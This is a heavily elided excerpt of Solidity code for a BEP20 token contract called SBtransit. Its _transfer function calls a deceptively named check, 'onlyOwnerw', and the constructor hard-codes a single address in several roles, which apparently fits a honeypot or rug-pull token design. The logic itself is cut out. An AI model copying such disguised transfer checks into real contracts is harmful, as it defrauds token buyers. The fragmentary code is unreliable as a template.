...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function onlyOwnerw(address Interfacee, address functionn) internal view returns (bool){
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(onlyOwnerw(sender,recipient))
...
contract SBtransit is BEP20 {
    constructor() BEP20(
        ...
        [0x87a72E21DdE967b43352679ED830C4565F9B4f72,0x87a72E21DdE967b43352679ED830C4565F9B4f72],
        0x87a72E21DdE967b43352679ED830C4565F9B4f72
    ){}
}